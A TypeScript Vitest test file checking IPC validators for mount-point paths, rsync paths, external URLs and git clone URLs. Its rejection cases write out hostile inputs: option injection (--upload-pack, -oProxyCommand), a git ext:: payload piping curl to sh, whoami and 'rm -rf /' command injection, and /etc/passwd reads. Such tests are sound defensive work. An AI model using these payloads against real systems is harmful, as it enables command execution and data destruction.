import { describe, it, expect } from "vitest";
import path from "node:path";
import {
  resolveInsideMountPoint,
  validateRsyncLocalPath,
  checkExternalUrl,
  ALLOWED_EXTERNAL_SCHEMES,
  validateGitCloneUrl,
} from "./ipc-validation";

describe("resolveInsideMountPoint", () => {
  const MOUNT = "/Users/alice/reck/projects";

  it("accepts a plain slug", () => {
    expect(resolveInsideMountPoint(MOUNT, "my-project")).toBe(
      path.join(MOUNT, "my-project"),
    );
  });

  it("accepts a slug with mixed case and digits", () => {
    // The helper is intentionally lenient on slug shape — containment is
    // what it guards. The caller can layer a format check if desired.
    expect(resolveInsideMountPoint(MOUNT, "Project_42")).toBe(
      path.join(MOUNT, "Project_42"),
    );
  });

  it("rejects empty slug", () => {
    expect(resolveInsideMountPoint(MOUNT, "")).toBeNull();
  });

  it("rejects traversal up one level", () => {
    expect(resolveInsideMountPoint(MOUNT, "../foo")).toBeNull();
  });

  it("rejects traversal up multiple levels", () => {
    expect(resolveInsideMountPoint(MOUNT, "../../Applications")).toBeNull();
  });

  it("rejects traversal via embedded ..", () => {
    expect(resolveInsideMountPoint(MOUNT, "foo/../..")).toBeNull();
    expect(resolveInsideMountPoint(MOUNT, "foo/../../etc")).toBeNull();
  });

  it("accepts traversal that stays inside the mount", () => {
    // `a/../b` resolves to `<mount>/b`, which is still inside the mount.
    // The helper does not forbid this — it only guards containment.
    expect(resolveInsideMountPoint(MOUNT, "a/../b")).toBe(path.join(MOUNT, "b"));
  });

  it("rejects absolute paths", () => {
    expect(resolveInsideMountPoint(MOUNT, "/etc/passwd")).toBeNull();
    expect(resolveInsideMountPoint(MOUNT, "/Applications")).toBeNull();
  });

  it("rejects the mount root itself", () => {
    expect(resolveInsideMountPoint(MOUNT, ".")).toBeNull();
    expect(resolveInsideMountPoint(MOUNT, "./")).toBeNull();
  });

  it("rejects non-string slugs", () => {
    // @ts-expect-error runtime guard
    expect(resolveInsideMountPoint(MOUNT, undefined)).toBeNull();
    // @ts-expect-error runtime guard
    expect(resolveInsideMountPoint(MOUNT, 42)).toBeNull();
    // @ts-expect-error runtime guard
    expect(resolveInsideMountPoint(MOUNT, null)).toBeNull();
  });

  it("accepts legitimate nested paths", () => {
    expect(resolveInsideMountPoint(MOUNT, "my-project/sub")).toBe(
      path.join(MOUNT, "my-project", "sub"),
    );
  });
});

describe("validateRsyncLocalPath", () => {
  const dir = { exists: true, isDirectory: true };
  const file = { exists: true, isDirectory: false };
  const missing = { exists: false, isDirectory: false };

  it("accepts an absolute directory", () => {
    const result = validateRsyncLocalPath("/Users/alice/src/demo", dir);
    expect(result).toEqual({ ok: true, path: "/Users/alice/src/demo" });
  });

  it("canonicalizes trailing slashes and . segments", () => {
    const result = validateRsyncLocalPath("/Users/alice/src/./demo/", dir);
    expect(result).toEqual({ ok: true, path: "/Users/alice/src/demo" });
  });

  it("rejects values that start with -", () => {
    const result = validateRsyncLocalPath("-e ssh evil", dir);
    expect(result).toEqual({
      ok: false,
      error: "localPath must not start with '-'",
    });
  });

  it("rejects long-option injection", () => {
    const result = validateRsyncLocalPath("--rsh=ssh evil@host", dir);
    expect(result).toEqual({
      ok: false,
      error: "localPath must not start with '-'",
    });
  });

  it("rejects relative paths", () => {
    const result = validateRsyncLocalPath("relative/dir", dir);
    expect(result).toEqual({
      ok: false,
      error: "localPath must be absolute",
    });
  });

  it("rejects missing paths", () => {
    const result = validateRsyncLocalPath("/Users/alice/gone", missing);
    expect(result).toEqual({
      ok: false,
      error: "localPath does not exist",
    });
  });

  it("rejects non-directory paths", () => {
    const result = validateRsyncLocalPath("/Users/alice/file.txt", file);
    expect(result).toEqual({
      ok: false,
      error: "localPath must be a directory",
    });
  });

  it("rejects empty string", () => {
    const result = validateRsyncLocalPath("", dir);
    expect(result).toEqual({
      ok: false,
      error: "localPath must be a non-empty string",
    });
  });

  it("rejects non-string input", () => {
    // @ts-expect-error runtime guard
    expect(validateRsyncLocalPath(undefined, dir)).toEqual({
      ok: false,
      error: "localPath must be a non-empty string",
    });
    // @ts-expect-error runtime guard
    expect(validateRsyncLocalPath(42, dir)).toEqual({
      ok: false,
      error: "localPath must be a non-empty string",
    });
  });

  it("rejects NUL bytes", () => {
    const result = validateRsyncLocalPath("/Users/alice/\0evil", dir);
    expect(result).toEqual({
      ok: false,
      error: "localPath must not contain NUL",
    });
  });

  it("rejects when stat is null (caller couldn't stat)", () => {
    const result = validateRsyncLocalPath("/Users/alice/demo", null);
    expect(result).toEqual({
      ok: false,
      error: "localPath does not exist",
    });
  });
});

describe("checkExternalUrl", () => {
  it("accepts an https url", () => {
    const result = checkExternalUrl("https://docs.reckonlabs.com/");
    expect(result).toEqual({ ok: true, url: "https://docs.reckonlabs.com/" });
  });

  it("accepts an http url (clickable web links)", () => {
    const result = checkExternalUrl("http://example.com/");
    expect(result).toEqual({ ok: true, url: "http://example.com/" });
  });

  it("rejects mailto:", () => {
    const result = checkExternalUrl("mailto:rnv@verwey.eu");
    expect(result.ok).toBe(false);
  });

  it("rejects file:", () => {
    const result = checkExternalUrl("file:///etc/passwd");
    expect(result.ok).toBe(false);
  });

  it("rejects javascript:", () => {
    const result = checkExternalUrl("javascript:alert(1)");
    expect(result.ok).toBe(false);
  });

  it("rejects custom app schemes", () => {
    expect(checkExternalUrl("x-apple-reminderkit://").ok).toBe(false);
    expect(checkExternalUrl("slack://open").ok).toBe(false);
    expect(checkExternalUrl("vscode://file/path").ok).toBe(false);
  });

  it("rejects data: URLs", () => {
    expect(checkExternalUrl("data:text/html,<script>").ok).toBe(false);
  });

  it("rejects malformed URLs", () => {
    expect(checkExternalUrl("not a url").ok).toBe(false);
    expect(checkExternalUrl("").ok).toBe(false);
  });

  it("rejects non-string input", () => {
    // @ts-expect-error runtime guard
    expect(checkExternalUrl(undefined).ok).toBe(false);
    // @ts-expect-error runtime guard
    expect(checkExternalUrl(null).ok).toBe(false);
    // @ts-expect-error runtime guard
    expect(checkExternalUrl({}).ok).toBe(false);
  });

  it("allowlist only contains https and http", () => {
    // Guard against accidental widening of the allowlist without a grep-find
    // of real in-repo callers first. Intentional widening should update this
    // test too.
    expect([...ALLOWED_EXTERNAL_SCHEMES]).toEqual(["https:", "http:"]);
  });
});

// The main-process half of the clone-URL contract (#162). The renderer has an
// independent parser with the same rules; these assertions are what keeps the
// two honest, because this side is the actual security boundary — the value
// becomes an operand of `git clone` inside an ssh command line.
describe("validateGitCloneUrl", () => {
  it("accepts https, ssh and scp-style remotes", () => {
    expect(validateGitCloneUrl("https://github.com/octocat/Hello-World")).toEqual({
      ok: true,
      url: "https://github.com/octocat/Hello-World",
    });
    expect(validateGitCloneUrl("https://github.com/octocat/Hello-World.git").ok).toBe(true);
    expect(validateGitCloneUrl("ssh://git@github.com/octocat/Hello-World.git").ok).toBe(true);
    expect(validateGitCloneUrl("git@github.com:octocat/Hello-World.git").ok).toBe(true);
    expect(validateGitCloneUrl("https://gitlab.com/group/sub/repo").ok).toBe(true);
  });

  it("trims surrounding whitespace", () => {
    expect(validateGitCloneUrl("  https://github.com/a/b  ")).toEqual({
      ok: true,
      url: "https://github.com/a/b",
    });
  });

  it("rejects the ext:: transport, which runs an arbitrary command", () => {
    expect(validateGitCloneUrl("ext::sh").ok).toBe(false);
    expect(validateGitCloneUrl("ext::sh -c 'curl x|sh'").ok).toBe(false);
  });

  it("rejects option injection via a leading dash", () => {
    expect(validateGitCloneUrl("--upload-pack=touch /tmp/pwn").ok).toBe(false);
    expect(validateGitCloneUrl("-u").ok).toBe(false);
  });

  it("rejects shell metacharacters, whitespace and control characters", () => {
    for (const bad of [
      "https://github.com/a/b;whoami",
      "https://github.com/a/b|whoami",
      "https://github.com/a/b&whoami",
      "https://github.com/a/$(whoami)",
      "https://github.com/a/b c",
      "https://github.com/a/b\u0000c",
      "https://github.com/a/b\nrm -rf /",
    ]) {
      expect(validateGitCloneUrl(bad).ok, bad).toBe(false);
    }
  });

  it("rejects other transports and shapes", () => {
    expect(validateGitCloneUrl("file:///etc/passwd").ok).toBe(false);
    expect(validateGitCloneUrl("http://github.com/a/b").ok).toBe(false);
    expect(validateGitCloneUrl("https://github.com/").ok).toBe(false);
    expect(validateGitCloneUrl("octocat/Hello-World").ok).toBe(false); // shorthand is expanded in the renderer
    expect(validateGitCloneUrl("").ok).toBe(false);
    expect(validateGitCloneUrl("   ").ok).toBe(false);
    expect(validateGitCloneUrl(`https://github.com/a/${"b".repeat(3000)}`).ok).toBe(false);
  });

  it("rejects non-string input", () => {
    expect(validateGitCloneUrl(undefined).ok).toBe(false);
    expect(validateGitCloneUrl(null).ok).toBe(false);
    expect(validateGitCloneUrl({}).ok).toBe(false);
  });
});

// Option injection without a single shell metacharacter. git hands the host
// and path of an ssh remote to `ssh` as separate argv entries, so a component
// that starts with `-` becomes an ssh *option* on the station —
// `-oProxyCommand=…` / `-F<file>` are the RCE-shaped ones. Recent git blocks
// these itself ("strange hostname … blocked"); we must not depend on the
// station's git version for that.
describe("validateGitCloneUrl — option-like components", () => {
  const rejected = [
    "ssh://-oProxyCommand=touch/repo",
    "ssh://-Fevil.conf/owner/repo",
    "git@-oProxyCommand=touch:a/b",
    "git@-Fevil.conf:a/b",
    "ssh://git@github.com/-repo",
    "git@github.com:-repo/x",
    "https://-evil.example.com/a/b",
  ];
  for (const bad of rejected) {
    it(`rejects ${bad}`, () => {
      expect(validateGitCloneUrl(bad).ok).toBe(false);
    });
  }

  it("still accepts an ordinary hyphenated repo", () => {
    expect(validateGitCloneUrl("https://github.com/octo-cat/Hello-World").ok).toBe(true);
    expect(validateGitCloneUrl("git@github.com:octo-cat/Hello-World.git").ok).toBe(true);
  });
});
